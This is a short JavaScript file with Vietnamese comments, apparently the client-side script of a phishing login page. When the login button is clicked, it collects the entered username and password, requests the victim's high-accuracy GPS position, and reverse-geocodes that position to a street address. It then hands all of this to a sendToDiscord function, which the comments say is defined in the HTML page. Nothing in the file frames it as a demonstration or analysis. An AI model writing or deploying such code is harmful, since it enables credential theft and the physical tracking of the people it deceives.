// === LẤY GPS CHÍNH XÁC ===
function getLocationGPS(callback) {
    if (!navigator.geolocation) {
        callback(null);
        return;
    }
    navigator.geolocation.getCurrentPosition(
        function(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = pos.coords.accuracy;

            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`)
                .then(res => res.json())
                .then(data => {
                    callback({
                        lat: lat,
                        lon: lon,
                        acc: acc,
                        address: data.display_name || 'Không xác định'
                    });
                })
                .catch(() => {
                    callback({
                        lat: lat,
                        lon: lon,
                        acc: acc,
                        address: 'Lỗi lấy địa chỉ'
                    });
                });
        },
        function(err) {
            callback(null);
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// === KHI BẤM NÚT LOGIN (LẤY USER/PASS + GPS + GỬI DISCORD) ===
document.addEventListener('DOMContentLoaded', function() {
    const loginBtn = document.getElementById('loginBtn');
    if (!loginBtn) return;

    loginBtn.addEventListener('click', function() {
        const username = document.getElementById('username').value || 'Không có';
        const password = document.getElementById('password').value || 'Không có';

        getLocationGPS(function(location) {
            // === GỌI HÀM DISCORD CÓ SẴN TRONG HTML ===
            if (typeof sendToDiscord === 'function') {
                sendToDiscord(username, password, location);
            } else {
                console.error('Không tìm thấy hàm sendToDiscord trong HTML');
            }
        });
    });
});
